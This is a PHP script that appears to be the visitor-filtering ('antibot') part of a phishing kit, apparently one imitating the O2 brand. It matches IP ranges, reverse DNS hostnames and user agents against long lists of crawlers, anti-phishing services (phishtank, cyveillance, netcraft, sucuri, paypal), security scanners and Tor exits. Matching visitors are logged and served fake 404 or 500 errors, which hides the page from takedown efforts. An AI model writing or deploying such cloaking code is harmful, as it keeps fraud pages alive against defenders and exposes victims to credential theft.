<?php
$botipclick = $_SERVER['REMOTE_ADDR'];

if (!empty($_SERVER['HTTP_CLIENT_IP']))  
    {

      $vis_ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   
    {
      $vis_ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $vis_ip=$_SERVER['REMOTE_ADDR'];
    }
$agent=$_SERVER['HTTP_USER_AGENT'];

$bots_ua = '/BotLink|bingbot|AhrefsBot|ahoy|AlkalineBOT|anthill|appie|arale|araneo|AraybOt|ariadne|arks|ATN_Worldwide|Atomz|bbot|Bjaaland|Ukonline|borg\-bot\/0\.9|boxseabot|bspider|calif|christcrawler|CMC\/0\.01|combine|confuzzledbot|CoolBot|cosmos|Internet Cruiser Robot|cusco|cyberspyder|cydralspider|desertrealm, desert realm|digger|DIIbot|grabber|downloadexpress|DragonBot|dwcp|ecollector|ebiness|elfinbot|esculapio|esther|fastcrawler|FDSE|FELIX IDE|ESI|fido|H?m?h?kki|KIT\-Fireball|fouineur|Freecrawl|gammaSpider|gazz|gcreep|golem|googlebot|Googlebot|griffon|Gromit|gulliver|gulper|hambot|havIndex|hotwired|htdig|iajabot|INGRID\/0\.1|Informant|InfoSpiders|inspectorwww|irobot|Iron33|JBot|jcrawler|Teoma|Jeeves|jobo|image\.kapsi\.net|KDD\-Explorer|ko_yappo_robot|label\-grabber|larbin|legs|Linkidator|linkwalker|Lockon|logo_gif_crawler|marvin|mattie|mediafox|MerzScope|NEC\-MeshExplorer|MindCrawler|udmsearch|moget|Motor|msnbot|muncher|muninn|MuscatFerret|MwdSearch|sharp\-info\-agent|WebMechanic|NetScoop|newscan\-online|ObjectsSearch|Occam|Orbsearch\/1\.0|packrat|pageboy|ParaSite|patric|pegasus|perlcrawler|phpdig|piltdownman|Pimptrain|pjspider|PlumtreeWebAccessor|PortalBSpider|psbot|Getterrobo\-Plus|Raven|RHCS|RixBot|roadrunner|Robbie|robi|RoboCrawl|robofox|Scooter|Search\-AU|searchprocess|Senrigan|Shagseeker|sift|SimBot|Site Valet|skymob|SLCrawler\/2\.0|slurp|ESI|snooper|solbot|speedy|spider_monkey|SpiderBot\/1\.0|spiderline|nil|suke|http:\/\/www\.sygol\.com|tach_bw|TechBOT|templeton|titin|topiclink|UdmSearch|urlck|Valkyrie libwww\-perl|verticrawl|Victoria|void\-bot|Voyager|VWbot_K|crawlpaper|wapspider|WebBandit\/1\.0|webcatcher|T\-H\-U\-N\-D\-E\-R\-S\-T\-O\-N\-E|WebMoose|webquest|webreaper|webs|webspider|WebWalker|wget|winona|whowhere|wlm|WOLP|WWWC|none|XGET|Nederland\.zoek|AISearchBot|woriobot|NetSeer|Nutch|YandexBot|YandexMobileBot|SemrushBot|FatBot|MJ12bot|DotBot|AddThis|baiduspider|SeznamBot|mod_pagespeed|CCBot|openstat.ru\/Bot|m2e|google|mediapartners|Ipad Iphone Safari|Python-urllib|HeadlessChrome|PhantomJS|zgrab\/0.x|BingPreview\/1.0b|^$/i';
$bots_host="/above|google|softlayer|cyveillance|phishtank|dreamhost|netpilot|calyxinstitute|tor-exit|paypal/i";
if(preg_match($bots_ua, $agent) || preg_match($bots_host, gethostbyaddr($vis_ip)) || $agent=="Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)" ||  !filter_var( $vis_ip, FILTER_VALIDATE_IP ))
{
  $click .= "".$botipclick."\n";
  $clickfile=fopen("logs/O2-removed.txt","a");
  fwrite($clickfile,$click);
  fclose($clickfile);	 
	header($_SERVER['SERVER_PROTOCOL'] . ' 500 Internal Server Error', true, 500);
	die("<h1>500 Internal Server Error</h1>");
}

$data   = file_get_contents('ips.txt'); 
if (strpos($data, "\r\n") !== false) {
    $data   = explode("\r\n", $data);
}
else
{
$data   = explode("\n", $data);
}

$bannedIP = array("^66.102.*.*", "^38.100.*.*", "^107.170.*.*",
 "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*",
 "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", 
"^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*",
 "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*",
 "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*",
 "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*",
 "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*",
 "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*",
 "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*",
 "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*",
 "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*",
 "^50.97.*.*", 
 "^217.132.*.*", 
 "^209.85.*.*", 
 "^66.205.64.*", 
"^204.14.48.*", 
"^64.27.2.*", 
"^67.15.*.*", 
"^202.108.252.*", 
"^193.47.80.*", 
"^64.62.136.*", 
"^66.221.*.*", 
"^64.62.175.*", 
"^198.54.*.*", 
"^192.115.134.*", 
"^216.252.167.*", 
"^193.253.199.*",
"^69.61.12.*", 
"^64.37.103.*", 
"^38.144.36.*", 
"^64.124.14.*", 
"^206.28.72.*", 
"^209.73.228.*", 
"^158.108.*.*", 
"^168.188.*.*", 
"^66.207.120.*",
"^167.24.*.*", 
"^192.118.48.*", 
"^67.209.128.*", 
"^12.148.209.*", 
"^12.148.196.*",
"^193.220.178.*",
"68.65.53.71", 
"54.207.34.86", 
"18.230.58.48",
"68.183.245.118",
"40.65.107.46",
"^198.25.*.*",
"35.187.132.9",
"204.13.201.137",
"66.102.6.243", 
"174.138.115.170",
"178.128.140.117",
"178.154.148.110",
"159.65.210.36",
"147.147.220.41",
"68.183.241.134",
"147.147.220.91",
"52.175.242.240",
"159.65.210.36",
"52.229.20.27",
"68.183.245.118",          
"^64.106.213.*");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     // this is for exact matches of IP address in array
 		$click .= "".$botipclick."\n";
		$clickfile=fopen("logs/O2-removed.txt","a");
		fwrite($clickfile,$click);
		fclose($clickfile);	    
 header('HTTP/1.0 404 Not Found');
 die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
 exit;
} else {
     // this is for wild card matches
     foreach($bannedIP as $ip) {
          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
			  $file=fopen("bots.txt","a");
		fwrite($file,$_SERVER['REMOTE_ADDR'].' '.$_SERVER['HTTP_USER_AGENT']."\r\n");
    fclose($file);
    $click .= "".$botipclick."\n";
		$clickfile=fopen("logs/O2-removed.txt","a");
		fwrite($clickfile,$click);
		fclose($clickfile);	 
 header('HTTP/1.0 404 Not Found');
 die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
 exit;
          }
     }
}

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","dbot",
"ebot",
"hbot",
"kbot",
"lbot",
"mbot",
"nbot",
"obot",
"pbot",
"rbot",
"sbot",
"tbot",
"vbot",
"ybot",
"zbot",
"bot.",
"bot/",
"_bot",
".bot",
"/bot",
"-bot",
":bot",
"(bot",
"crawl",
"slurp",
"spider",
"seek",
"accoona",
"acoon",
"adressendeutschland",
"ah-ha.com",
"ahoy",
"altavista",
"ananzi",
"anthill",
"appie",
"arachnophilia",
"arale",
"araneo",
"aranha",
"architext",
"aretha",
"arks",
"asterias",
"atlocal",
"atn",
"atomz",
"augurfind",
"backrub",
"bannana_bot",
"baypup",
"bdfetch",
"big brother",
"biglotron",
"bjaaland",
"blackwidow",
"blaiz",
"blog",
"blo.",
"bloodhound",
"boitho",
"booch",
"bradley",
"butterfly",
"calif",
"cassandra",
"ccubee",
"cfetch",
"charlotte",
"churl",
"cienciaficcion",
"cmc",
"collective",
"comagent",
"combine",
"computingsite",
"csci",
"curl",
"cusco",
"daumoa",
"deepindex",
"delorie",
"depspid",
"deweb",
"die blinde kuh",
"digger",
"ditto",
"dmoz",
"docomo",
"download express",
"dtaagent",
"dwcp",
"ebiness",
"ebingbong",
"e-collector",
"ejupiter",
"emacs-w3 search engine",
"esther",
"evliya celebi",
"ezresult",
"falcon",
"felix ide",
"ferret",
"fetchrover",
"fido",
"findlinks",
"fireball",
"fish search",
"fouineur",
"funnelweb",
"gazz",
"gcreep",
"genieknows",
"getterroboplus",
"geturl",
"glx",
"goforit",
"golem",
"grabber",
"grapnel",
"gralon",
"griffon",
"gromit",
"grub",
"gulliver",
"hamahakki",
"harvest",
"havindex",
"helix",
"heritrix",
"hku www octopus",
"homerweb",
"htdig",
"html index",
"html_analyzer",
"htmlgobble",
"hubater",
"hyper-decontextualizer",
"ia_archiver",
"ibm_planetwide",
"ichiro",
"iconsurf",
"iltrovatore",
"image.kapsi.net",
"imagelock",
"incywincy",
"indexer",
"infobee",
"informant",
"ingrid",
"inktomisearch.com",
"inspector web",
"intelliagent",
"internet shinchakubin",
"ip3000",
"iron33",
"israeli-search",
"ivia",
"jack",
"jakarta",
"javabee",
"jetbot",
"jumpstation",
"katipo",
"kdd-explorer",
"kilroy",
"knowledge",
"kototoi",
"kretrieve",
"labelgrabber",
"lachesis",
"larbin",
"legs",
"libwww",
"linkalarm",
"link validator",
"linkscan",
"lockon",
"lwp",
"lycos",
"magpie",
"mantraagent",
"mapoftheinternet",
"marvin/",
"mattie",
"mediafox",
"mediapartners",
"mercator",
"merzscope",
"microsoft url control",
"minirank",
"miva",
"mj12",
"mnogosearch",
"moget",
"monster",
"moose",
"motor",
"multitext",
"muncher",
"muscatferret",
"mwd.search",
"myweb",
"najdi",
"nameprotect",
"nationaldirectory",
"nazilla",
"ncsa beta",
"nec-meshexplorer",
"nederland.zoek",
"netcarta webmap engine",
"netmechanic",
"netresearchserver",
"netscoop",
"newscan-online",
"nhse",
"nokia6682/",
"nomad",
"noyona",
"nutch",
"nzexplorer",
"objectssearch",
"occam",
"omni",
"open text",
"openfind",
"openintelligencedata",
"orb search",
"osis-project",
"pack rat",
"pageboy",
"pagebull",
"page_verifier",
"panscient",
"parasite",
"partnersite",
"patric",
"pear.",
"pegasus",
"peregrinator",
"pgp key agent",
"phantom",
"phpdig",
"picosearch",
"piltdownman",
"pimptrain",
"pinpoint",
"pioneer",
"piranha",
"plumtreewebaccessor",
"pogodak",
"poirot",
"pompos",
"poppelsdorf",
"poppi",
"popular iconoclast",
"psycheclone",
"publisher",
"python",
"rambler",
"raven search",
"roach",
"road runner",
"roadhouse",
"robbie",
"robofox",
"robozilla",
"rules",
"salty",
"sbider",
"scooter",
"scoutjet",
"scrubby",
"search.",
"searchprocess",
"semanticdiscovery",
"senrigan",
"sg-scout",
"shai'hulud",
"shark",
"shopwiki",
"sidewinder",
"sift",
"silk",
"simmany",
"site searcher",
"site valet",
"sitetech-rover",
"skymob.com",
"sleek",
"smartwit",
"sna-",
"snappy",
"snooper",
"sohu",
"speedfind",
"sphere",
"sphider",
"spinner",
"spyder",
"steeler/",
"suke",
"suntek",
"supersnooper",
"surfnomore",
"sven",
"sygol",
"szukacz",
"tach black widow",
"tarantula",
"templeton",
"/teoma",
"t-h-u-n-d-e-r-s-t-o-n-e",
"theophrastus",
"titan",
"titin",
"tkwww",
"toutatis",
"t-rex",
"tutorgig",
"twiceler",
"twisted",
"ucsd",
"udmsearch",
"url check",
"updated",
"vagabondo",
"valkyrie",
"verticrawl",
"victoria",
"vision-search",
"volcano",
"voyager/",
"voyager-hc",
"w3c_validator",
"w3m2",
"w3mir",
"walker",
"wallpaper",
"wanderer",
"wauuu",
"wavefire",
"web core",
"web hopper",
"web wombat",
"webbandit",
"webcatcher",
"webcopy",
"webfoot",
"weblayers",
"weblinker",
"weblog monitor",
"webmirror",
"webmonkey",
"webquest",
"webreaper",
"websitepulse",
"websnarf",
"webstolperer",
"webvac",
"webwalk",
"webwatch",
"webwombat",
"webzinger",
"wget",
"whizbang",
"whowhere",
"wild ferret",
"worldlight",
"wwwc",
"wwwster",
"xenu",
"xget",
"xift",
"xirq",
"yandex",
"yanga",
"yeti",
"yodao",
"zao/",
"zippp",
"zyborg",
"....",
"007ac9",
"008",
"4seohuntbot",
"50.nu",
"80legs.com/webcrawler",
"192.comagent",
"200pleasebot",
"360spider",
"a6-indexer",
"aboundexbot",
"aboutusbot",
"above",
"abrave spider",
"accelobot",
"acoonbot",
"acunetix",
"addthis.com",
"admantx",
"adsbot-google",
"AhrefsBot",
"ahrefsbot",
"alexabot",
"amagit.com",
"amazonaws",
"amznkassocbot",
"analytics",
"antbot",
"apache-httpclient",
"apercite",
"aportworm",
"arabot",
"Baiduspider",
"BazQuxBot",
"bingbot",
"bot",
"Butterfly",
"calyxinstitute",
"compatible",
"crawler",
"cyveillance",
"Dr.Web",
"dreamhost",
"drweb",
"ebay",
"echo blinde kuh",
"Exabot",
"Ezooms",
"facebook",
"facebookexternalhit",
"Feedfetcher-Google",
"Feedly",
"google",
"Googlebot",
"GrapeshotCrawler",
"grokkit-crawler",
"hostinger",
"InAGist",
"jetbrains",
"Kraken",
"lssrocketcrawler",
"magpie-crawler",
"MaxPointCrawler",
"Mediapartners-Google",
"merlinkbot",
"messagelabs",
"MJ12bot",
"mon.itor.us",
"mozilla",
"msnbot",
"netcraft",
"NetcraftSurveyAgent",
"netpilot",
"NetSeer crawler",
"netsparker",
"NING",
"p3pwgdsn",
"PaperLiBot",
"paypal",
"PercolateCrawler",
"phishtank",
"picsearch",
"PrintfulBot",
"PulseCrawler",
"Python-urllib",
"QuerySeekerSpider",
"R6_CommentReader",
"R6_FeedFetcher",
"scanurl",
"SearchmetricsBot",
"shai",
"hulud",
"ShowyouBot",
"SISTRIX Crawler",
"SMXCrawler",
"softlayer",
"Sogou web spider",
"spam",
"spbot",
"Spinn3r",
"sucuri.net",
"TencentTraveler",
"tor-exit",
"torservers",
"trendmicro",
"Trident",
"TweetedTimes Bot",
"TweetmemeBot",
"Twitterbot",
"UnwindFetchor",
"urlredirectresolver",
"urlresolver",
"wildferret",
"windows 95",
"windows 98",
"Windows XP",
"windows xp",
"woriobot",
"X11",
"Y!J-BRW",
"Yahoo! Slurp",
"yahoo!",
"YandexBot");
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
		$file=fopen("bots.txt","a");
		fwrite($file,$_SERVER['REMOTE_ADDR'].' '.$_SERVER['HTTP_USER_AGENT']."\r\n");
    fclose($file);
    $click .= "".$botipclick."\n";
		$clickfile=fopen("logs/O2-removed.txt","a");
		fwrite($clickfile,$click);
		fclose($clickfile);	 
 header('HTTP/1.0 404 Not Found');
 die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
 exit;

    }  
}																																																																																																
if( !empty($_SERVER['HTTP_USER_AGENT']) ) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler","dbot",
"ebot",
"hbot",
"kbot",
"lbot",
"mbot",
"nbot",
"obot",
"pbot",
"rbot",
"sbot",
"tbot",
"vbot",
"ybot",
"zbot",
"bot.",
"bot/",
"_bot",
".bot",
"/bot",
"-bot",
":bot",
"(bot",
"crawl",
"slurp",
"spider",
"seek",
"accoona",
"acoon",
"adressendeutschland",
"ah-ha.com",
"ahoy",
"altavista",
"ananzi",
"anthill",
"appie",
"arachnophilia",
"arale",
"araneo",
"aranha",
"architext",
"aretha",
"arks",
"asterias",
"atlocal",
"atn",
"atomz",
"augurfind",
"backrub",
"bannana_bot",
"baypup",
"bdfetch",
"big brother",
"biglotron",
"bjaaland",
"blackwidow",
"blaiz",
"blog",
"blo.",
"bloodhound",
"boitho",
"booch",
"bradley",
"butterfly",
"calif",
"cassandra",
"ccubee",
"cfetch",
"charlotte",
"churl",
"cienciaficcion",
"cmc",
"collective",
"comagent",
"combine",
"computingsite",
"csci",
"curl",
"cusco",
"daumoa",
"deepindex",
"delorie",
"depspid",
"deweb",
"die blinde kuh",
"digger",
"ditto",
"dmoz",
"docomo",
"download express",
"dtaagent",
"dwcp",
"ebiness",
"ebingbong",
"e-collector",
"ejupiter",
"emacs-w3 search engine",
"esther",
"evliya celebi",
"ezresult",
"falcon",
"felix ide",
"ferret",
"fetchrover",
"fido",
"findlinks",
"fireball",
"fish search",
"fouineur",
"funnelweb",
"gazz",
"gcreep",
"genieknows",
"getterroboplus",
"geturl",
"glx",
"goforit",
"golem",
"grabber",
"grapnel",
"gralon",
"griffon",
"gromit",
"grub",
"gulliver",
"hamahakki",
"harvest",
"havindex",
"helix",
"heritrix",
"hku www octopus",
"homerweb",
"htdig",
"html index",
"html_analyzer",
"htmlgobble",
"hubater",
"hyper-decontextualizer",
"ia_archiver",
"ibm_planetwide",
"ichiro",
"iconsurf",
"iltrovatore",
"image.kapsi.net",
"imagelock",
"incywincy",
"indexer",
"infobee",
"informant",
"ingrid",
"inktomisearch.com",
"inspector web",
"intelliagent",
"internet shinchakubin",
"ip3000",
"iron33",
"israeli-search",
"ivia",
"jack",
"jakarta",
"javabee",
"jetbot",
"jumpstation",
"katipo",
"kdd-explorer",
"kilroy",
"knowledge",
"kototoi",
"kretrieve",
"labelgrabber",
"lachesis",
"larbin",
"legs",
"libwww",
"linkalarm",
"link validator",
"linkscan",
"lockon",
"lwp",
"lycos",
"magpie",
"mantraagent",
"mapoftheinternet",
"marvin/",
"mattie",
"mediafox",
"mediapartners",
"mercator",
"merzscope",
"microsoft url control",
"minirank",
"miva",
"mj12",
"mnogosearch",
"moget",
"monster",
"moose",
"motor",
"multitext",
"muncher",
"muscatferret",
"mwd.search",
"myweb",
"najdi",
"nameprotect",
"nationaldirectory",
"nazilla",
"ncsa beta",
"nec-meshexplorer",
"nederland.zoek",
"netcarta webmap engine",
"netmechanic",
"netresearchserver",
"netscoop",
"newscan-online",
"nhse",
"nokia6682/",
"nomad",
"noyona",
"nutch",
"nzexplorer",
"objectssearch",
"occam",
"omni",
"open text",
"openfind",
"openintelligencedata",
"orb search",
"osis-project",
"pack rat",
"pageboy",
"pagebull",
"page_verifier",
"panscient",
"parasite",
"partnersite",
"patric",
"pear.",
"pegasus",
"peregrinator",
"pgp key agent",
"phantom",
"phpdig",
"picosearch",
"piltdownman",
"pimptrain",
"pinpoint",
"pioneer",
"piranha",
"plumtreewebaccessor",
"pogodak",
"poirot",
"pompos",
"poppelsdorf",
"poppi",
"popular iconoclast",
"psycheclone",
"publisher",
"python",
"rambler",
"raven search",
"roach",
"road runner",
"roadhouse",
"robbie",
"robofox",
"robozilla",
"rules",
"salty",
"sbider",
"scooter",
"scoutjet",
"scrubby",
"search.",
"searchprocess",
"semanticdiscovery",
"senrigan",
"sg-scout",
"shai'hulud",
"shark",
"shopwiki",
"sidewinder",
"sift",
"silk",
"simmany",
"site searcher",
"site valet",
"sitetech-rover",
"skymob.com",
"sleek",
"smartwit",
"sna-",
"snappy",
"snooper",
"sohu",
"speedfind",
"sphere",
"sphider",
"spinner",
"spyder",
"steeler/",
"suke",
"suntek",
"supersnooper",
"surfnomore",
"sven",
"sygol",
"szukacz",
"tach black widow",
"tarantula",
"templeton",
"/teoma",
"t-h-u-n-d-e-r-s-t-o-n-e",
"theophrastus",
"titan",
"titin",
"tkwww",
"toutatis",
"t-rex",
"tutorgig",
"twiceler",
"twisted",
"ucsd",
"udmsearch",
"url check",
"updated",
"vagabondo",
"valkyrie",
"verticrawl",
"victoria",
"vision-search",
"volcano",
"voyager/",
"voyager-hc",
"w3c_validator",
"w3m2",
"w3mir",
"walker",
"wallpaper",
"wanderer",
"wauuu",
"wavefire",
"web core",
"web hopper",
"web wombat",
"webbandit",
"webcatcher",
"webcopy",
"webfoot",
"weblayers",
"weblinker",
"weblog monitor",
"webmirror",
"webmonkey",
"webquest",
"webreaper",
"websitepulse",
"websnarf",
"webstolperer",
"webvac",
"webwalk",
"webwatch",
"webwombat",
"webzinger",
"wget",
"whizbang",
"whowhere",
"wild ferret",
"worldlight",
"wwwc",
"wwwster",
"xenu",
"xget",
"xift",
"xirq",
"yandex",
"yanga",
"yeti",
"yodao",
"zao/",
"zippp",
"zyborg",
"....",
"007ac9",
"008",
"4seohuntbot",
"50.nu",
"80legs.com/webcrawler",
"192.comagent",
"200pleasebot",
"360spider",
"a6-indexer",
"aboundexbot",
"aboutusbot",
"above",
"abrave spider",
"accelobot",
"acoonbot",
"acunetix",
"addthis.com",
"admantx",
"adsbot-google",
"AhrefsBot",
"ahrefsbot",
"alexabot",
"amagit.com",
"amazonaws",
"amznkassocbot",
"analytics",
"antbot",
"apache-httpclient",
"apercite",
"aportworm",
"arabot",
"Baiduspider",
"BazQuxBot",
"bingbot",
"bot",
"Butterfly",
"calyxinstitute",
"compatible",
"crawler",
"cyveillance",
"Dr.Web",
"dreamhost",
"drweb",
"ebay",
"echo blinde kuh",
"Exabot",
"Ezooms",
"facebook",
"facebookexternalhit",
"Feedfetcher-Google",
"Feedly",
"google",
"Googlebot",
"GrapeshotCrawler",
"grokkit-crawler",
"hostinger",
"InAGist",
"jetbrains",
"Kraken",
"lssrocketcrawler",
"magpie-crawler",
"MaxPointCrawler",
"Mediapartners-Google",
"merlinkbot",
"messagelabs",
"MJ12bot",
"mon.itor.us",
"mozilla",
"msnbot",
"netcraft",
"NetcraftSurveyAgent",
"netpilot",
"NetSeer crawler",
"netsparker",
"NING",
"p3pwgdsn",
"PaperLiBot",
"paypal",
"PercolateCrawler",
"phishtank",
"picsearch",
"PrintfulBot",
"PulseCrawler",
"Python-urllib",
"QuerySeekerSpider",
"R6_CommentReader",
"R6_FeedFetcher",
"scanurl",
"SearchmetricsBot",
"shai",
"hulud",
"ShowyouBot",
"SISTRIX Crawler",
"SMXCrawler",
"softlayer",
"Sogou web spider",
"spam",
"spbot",
"Spinn3r",
"sucuri.net",
"TencentTraveler",
"tor-exit",
"torservers",
"trendmicro",
"Trident",
"TweetedTimes Bot",
"TweetmemeBot",
"Twitterbot",
"UnwindFetchor",
"urlredirectresolver",
"urlresolver",
"wildferret",
"windows 95",
"windows 98",
"Windows XP",
"windows xp",
"woriobot",
"X11",
"Y!J-BRW",
"Yahoo! Slurp",
"yahoo!",
"YandexBot");
    foreach($userAgents as $agent)
        if( strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false ) {
			$file=fopen("bots.txt","a");
		fwrite($file,$_SERVER['REMOTE_ADDR'].' '.$_SERVER['HTTP_USER_AGENT']."\r\n");
    fclose($file);
    $click .= "".$botipclick."\n";
		$clickfile=fopen("logs/O2-removed.txt","a");
		fwrite($clickfile,$click);
		fclose($clickfile);	 
 header('HTTP/1.0 404 Not Found');
 die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
 exit;
      }}
$bannedIP = array("^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
  $click .= "".$botipclick."\n";
  $clickfile=fopen("logs/O2-removed.txt","a");
  fwrite($clickfile,$click);
  fclose($clickfile);	 	
 header('HTTP/1.0 404 Not Found');
 die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
 exit;
} else {
     foreach($bannedIP as $ip) {
          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
			  $file=fopen("bots.txt","a");
		fwrite($file,$_SERVER['REMOTE_ADDR'].' '.$_SERVER['HTTP_USER_AGENT']."\r\n");
    fclose($file);
    $click .= "".$botipclick."\n";
		$clickfile=fopen("logs/O2-removed.txt","a");
		fwrite($clickfile,$click);
		fclose($clickfile);	 	
 header('HTTP/1.0 404 Not Found');
 die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
 exit;
          }
     }
}
